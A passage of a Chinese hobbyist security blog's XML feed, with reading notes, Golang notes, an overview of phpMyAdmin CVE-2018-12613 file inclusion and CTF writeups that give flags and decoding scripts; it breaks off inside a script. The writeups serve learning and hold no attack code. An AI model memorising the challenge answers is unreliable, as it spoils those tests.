class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记总篇</title>
      <link href="2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/"/>
      <url>2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="技术类书籍"><a href="#技术类书籍" class="headerlink" title="技术类书籍"></a>技术类书籍</h1><p>技术类没咋看过书，一般都是看大师傅们的博客来学习。</p><h1 id="小说类书籍"><a href="#小说类书籍" class="headerlink" title="小说类书籍"></a>小说类书籍</h1><h2 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h2><h3 id="梦的解析——西格蒙德·弗洛伊德"><a href="#梦的解析——西格蒙德·弗洛伊德" class="headerlink" title="梦的解析——西格蒙德·弗洛伊德"></a>梦的解析——西格蒙德·弗洛伊德</h3><p>2021年6月1日，看到了第<strong>二</strong>页，梦与现实是有关联的吗？就像自己现实中想上厕所，结果梦里面就去找厕所有没有什么特定的关系。是因为我们做梦了找厕所刺激了现实中我们被憋醒(或者尿床&lt;😀&gt;)，还是我们现实中想上厕所的感官刺激产生了梦，问题就是梦与现实是否具有因果关系，如果有，谁是因，谁是果？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哲思篇</title>
      <link href="2021/06/01/%E5%93%B2%E6%80%9D/"/>
      <url>2021/06/01/%E5%93%B2%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="梦境与现实"><a href="#梦境与现实" class="headerlink" title="梦境与现实"></a>梦境与现实</h2><p>梦境与现实一直以来都是值得展开讨论的话题，首先是梦与现实的相关性。</p><p>这方面西方的弗洛伊德和荣格研究得更深一点，中国的庄周梦蝶(我所知实在浅薄，竟不足以列出第二个人，但是几千年肯定有无数人思考研究过)，这里只是列出西方的两人的观念”师夷长技以制夷“。</p><p>西格蒙德·弗洛伊德：</p><p>不会总结，到此结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 简单思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE复现总刊</title>
      <link href="2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一些近年来的cve学习一下</p><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><strong>TAG: 文件包含漏洞、PhpMyAdmin写入Shell</strong></p><p>因为phpmyadmin本身也是用php来写的，所以php的一些漏洞在phpmyadmin里面也是可能出现的，这里就是一个简单的文件包含漏洞。</p><blockquote><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。</p><p>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><ul><li>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ul></blockquote><p>就是说只要你可以登录这个版本的phpmyadmin的话，就都可以实现任意代码执行。下面看一下审计代码的过程。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210530234831511.png" alt></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着技术的发展，好像说python越来越力不从心了。虽然python的语言格式十分简洁，代码也容易理解，本来我想做一个pythonista的来着，但是看群里都在讨论go语言这种新技术(对于我来说是新技术)，就想了解了解学一下看看go语言的优缺，看哪门语言更适合作为工具语言(语言被开发出来就是作为工具要用的)。PS：其实是总是听说go语言比python好(个人感觉就是好像在瞎吹一样)，想来看看到底好在哪里。</p><p><strong>主要在最近学习python开发之余学一学golang，现在的我也还没资格深入进去</strong></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接下个GoLand就行了，sdk这个ide会自己给你安装好的，也省得配置环境了，到现在为止还没有发现什么错误。社区版的应该就足够一般化的使用了。</p><h2 id="Go-是编译型语言"><a href="#Go-是编译型语言" class="headerlink" title="Go 是编译型语言"></a>Go 是编译型语言</h2><p>Go 使用编译器来编译代码。编译器将源代码编译成二进制（或字节码）格式；在编译代码时，编译器检查错误、优化性能并输出可在不同平台上运行的二进制文件。要创建并运行 Go 程序，程序员必须执行如下步骤。</p><ol><li>使用文本编辑器创建 Go 程序；</li><li>保存文件；</li><li>编译程序；</li><li>运行编译得到的可执行文件。</li></ol><p>这不同于 Python、Ruby 和 JavaScript 等语言，它们不包含编译步骤。Go 自带了编译器，因此无须单独安装编译器。</p><h2 id="Go特点"><a href="#Go特点" class="headerlink" title="Go特点"></a>Go特点</h2><p>快速编译，高效执行，易于开发。</p><p>Go语言支持交叉编译，比如说你可以在运行 Linux 系统的计算机上开发可以在 Windows 上运行的应用程序。这是第一门完全支持 UTF-8 的编程语言，这不仅体现在它可以处理使用 UTF-8 编码的字符串，就连它的源码文件格式都是使用的 UTF-8 编码。Go语言做到了真正的国际化！</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="Go语言中的变量"><a href="#Go语言中的变量" class="headerlink" title="Go语言中的变量"></a>Go语言中的变量</h2><h3 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h3><p>布尔类型：false</p><p>int类型  ：0</p><p>string类型：””</p><p>其他类型：nil</p><p>这里的其他类型官方文档给的解释是<code>Type must be a pointer, channel, func, interface, map, or slice type</code>。</p><p>也就是说必须是这六种类型<code>pointer, channel, func, interface, map, slice</code></p><h3 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token builtin">int</span>    <span class="token keyword">var</span> f <span class="token builtin">float64</span>    <span class="token keyword">var</span> b <span class="token builtin">bool</span>    <span class="token keyword">var</span> s <span class="token builtin">string</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v %v %q\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> f<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明方式有下面的两种，即</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> value1 <span class="token keyword">type</span> <span class="token operator">=</span> value2  或   <span class="token keyword">var</span> value1 <span class="token operator">=</span> value2value1 <span class="token operator">:=</span> value2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是上面的语句都是声明语句，在变量的生存周期内，变量只能被声明一次，这时只能用赋值操作<code>=</code>来改变变量的值，千万不要以为<code>:=</code>是赋值语句，这个只是一个简写的声明语句而已。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GoLang </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年各比赛wp</title>
      <link href="2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/"/>
      <url>2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="水平有限，大家包涵"><a href="#水平有限，大家包涵" class="headerlink" title="水平有限，大家包涵"></a>水平有限，大家包涵</h2><p>因为本人的时间与水平很有限，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。大家多多包涵。</p><h2 id="记录内容"><a href="#记录内容" class="headerlink" title="记录内容"></a>记录内容</h2><p>记录了2021年各个比赛所做题的wp，可能还会有复现的题目的wp。</p><h1 id="DozerCTF"><a href="#DozerCTF" class="headerlink" title="DozerCTF"></a>DozerCTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529192924991.png" alt="image-20210529192924991"></p><p>在视频中发现flag</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">DozerCTF&#123;w3lc0me_to_Do2erCTF&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><h4 id="用到的在线网站"><a href="#用到的在线网站" class="headerlink" title="用到的在线网站"></a>用到的在线网站</h4><p><a href="https://it365.gitlab.io/zh-cn/gif-frames/?zlan">在线动图分帧工具</a></p><p><a href="http://cdn.malu.me/qrdecode/">在线二维码扫描工具</a></p><h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>可以发现图片里面藏着两个图片文件，一个GIF文件，另一个是一个没用的PNG文件。用上面的在线分帧软件将图片一帧一帧地分开。得到的二维码再一张一张地扫得下面的内容(因为二维码也不是特别多，没必要再写个脚本搞)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 得到的内容是zoDCre&#123;FT_si_timiselp</span>s <span class="token operator">=</span> <span class="token string">'zoDCre&#123;FT_si_timiselp'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># DozerCTF&#123;is_it_simple</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以感觉后面还是有东西的，估计东西就是在后面我以为没用的那个png文件中了。再扫描以下后面的二维码发现是一个零宽隐写，在线扫描一下。</p><p>得到的内容似乎是<code>我已经看见了，‎‏‏‍‏‍‌‏‍‏‎‏‏‏‌‏‍‌‏‎‍‌‌‎‎‏‏‏‍‌‏‍‏‎‏‍‏‎‏‍‏‎‌‏‎‍‏‌‎‎‏‍‏‎‌‏‌‌你呢？</code>，零宽之后得到的内容是<code>tntentinttteteteee</code>，往下没做动。</p><h1 id="DASCTF-X-BUU"><a href="#DASCTF-X-BUU" class="headerlink" title="DASCTF X BUU"></a>DASCTF X BUU</h1><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/banner_1.png" alt="比赛banner"></p><h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>DASCTF，由杭州安恒信息网络空间安全学院主办，是面向所有网络安全爱好者举办的职业技能大赛，为优秀参赛选手提供相关职业实习机会；为热衷于竞赛的网络安全爱好者提供竞赛平台；为大赛挑选强劲战队，增加决赛获奖难度与竞赛乐趣；为用人单位选拔优质人才。 通过比赛形式，挖掘网络安全人才，提升网络安全建设能力，增强我国网络安全防御能力。 2021年，DASCTF与高校、战队合作，共举办6场竞赛，合作方包括海南大学、贵州大学、榆林学院、浙江农林大学、公大、国内知名CTF联盟BJD、国内知名战队NepNep、国内知名战队天璇Merak、国内知名战队V&amp;N，每场竞赛参与人数均在1500+，赛后调研好评率高达95%以上。</p><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_dasctf_may}</p><h3 id="Holmes"><a href="#Holmes" class="headerlink" title="Holmes"></a>Holmes</h3><p>一张图片，winhex打开发现后面是rar压缩包文件，然后分离压缩包，图片上跳舞的小人密码解出来压缩包的密钥为<code>YOYARHHOLMES</code>，根据那两个颜色稍显重一点的内容猜测那两位字符可能是需要猜的，所以口令就是<code>YOUAREHOLMES</code></p><p>解压出的python文件的内容为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">"flag&#123;********************************&#125;"</span>encflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encflag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79,76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单逆向一下得flag为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">encflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>encflag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038</span><span class="token comment"># flag&#123;46a4b3357e13f0755a42651250633038&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="rickroll-u"><a href="#rickroll-u" class="headerlink" title="rickroll_u"></a>rickroll_u</h3><p>明文攻击得口令为<code>t!m32R1</code></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529110002150.png" alt="明文攻击"></p><p>解压之后获得一段wav音频文件。</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="PaperPlease"><a href="#PaperPlease" class="headerlink" title="PaperPlease"></a>PaperPlease</h3><p>题目描述：简单的字符串解密</p><p>确实只是一段简单的逆向，给出的变换后的字符串的内容为<code>DASCTF&#123;5c715207e3abed7dfb7c8ea9c82d0e29&#125;</code></p><p>主要负责变换字符串的部分的代码的逆向内容为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">subfhsadkhjbfleiowiuoyfgshjdvbsmnakl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-24h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-20h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dest<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">unk_sa7ydu3jb432</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的部分再取最重要的变换的部分为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>unk_6984657 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里的<code>(_BYTE *)unk_6984657</code>应该是一个地址，后面的<code>*()</code>的所有内容为如下的数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">.rodata:0000000000002008 unk_2008        db  56h ; V             ; DATA XREF: .data:_unk_6984657↓o.rodata:0000000000002009                 db    5.rodata:000000000000200A                 db  53h ; S.rodata:000000000000200B                 db  52h ; R.rodata:000000000000200C                 db    4.rodata:000000000000200D                 db    3.rodata:000000000000200E                 db  53h ; S.rodata:000000000000200F                 db  54h ; T.rodata:0000000000002010                 db    4.rodata:0000000000002011                 db  0Bh.rodata:0000000000002012                 db  53h ; S.rodata:0000000000002013                 db  51h ; Q.rodata:0000000000002014                 db    6.rodata:0000000000002015                 db    6.rodata:0000000000002016                 db  0Fh.rodata:0000000000002017                 db  55h ; U.rodata:0000000000002018                 db    5.rodata:0000000000002019                 db  5Bh ; [.rodata:000000000000201A                 db    3.rodata:000000000000201B                 db  56h ; V.rodata:000000000000201C                 db  0Eh.rodata:000000000000201D                 db    7.rodata:000000000000201E                 db  57h ; W.rodata:000000000000201F                 db  0Eh.rodata:0000000000002020                 db    1.rodata:0000000000002021                 db  0Dh.rodata:0000000000002022                 db  56h ; V.rodata:0000000000002023                 db    0.rodata:0000000000002024                 db    4.rodata:0000000000002025                 db    6.rodata:0000000000002026                 db  0Ah.rodata:0000000000002027                 db  5Dh ; ].rodata:0000000000002028                 db    0.rodata:0000000000002029                 db    0.rodata:000000000000202A unk_202A        db  12h                 ; DATA XREF: init+30↑o.rodata:000000000000202B                 db  54h ; T.rodata:000000000000202C                 db  33h ; 3.rodata:000000000000202D                 db  0Ch.rodata:000000000000202E                 db  0Ah.rodata:000000000000202F                 db  1Ah.rodata:0000000000002030                 db    0.rodata:0000000000002031                 db    0.rodata:0000000000002032                 db    0.rodata:0000000000002033                 db    0.rodata:0000000000002034                 db    0.rodata:0000000000002035                 db    0.rodata:0000000000002036                 db    0.rodata:0000000000002037                 db    0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单整理一下为下面的内容（我不会写也没有ida的脚本，下面的全靠手工整理）</p><pre class="line-numbers language-none"><code class="language-none">key &#x3D; [0x56, 0x5, 0x53, 0x52, 0x4, 0x3, 0x53, 0x54, 0x4, 0x0B, 0x53, 0x51, 0x6, 0x6, 0x0F, 0x55, 0x5, 0x5B, 0x3, 0x56,       0x0E, 0x7, 0x57, 0x0E, 0x1, 0x0D, 0x56, 0x0, 0x4, 0x6, 0x0A, 0x5D, 0x0, 0x0, 0x12, 0x54, 0x33, 0x0C, 0x0A, 0x1A]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>简单逆向一下得flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ss <span class="token operator">=</span> <span class="token string">'5c715207e3abed7dfb7c8ea9c82d0e29'</span>s2 <span class="token operator">=</span> <span class="token string">''</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span>       <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token 